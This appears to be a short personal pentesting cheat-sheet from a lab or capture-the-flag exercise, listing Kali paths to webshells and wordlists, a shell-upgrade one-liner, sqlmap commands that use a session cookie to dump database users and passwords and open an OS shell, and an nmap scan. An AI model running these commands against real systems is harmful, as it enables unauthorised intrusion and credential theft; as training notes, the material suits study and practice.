
ruta interesante:
/usr/share/windows-resources/binaries/
/usr/share/webshells/php
/usr/share/wordlists/rockyou.txt

In order to have a functional shell though we can issue the following:
python3 -c 'import pty;pty.spawn("/bin/bash")'

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --users

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --password

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --os-shell

nmap -p 8443 --script http-title --script-args http.tls=true 10.129.60.191

/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
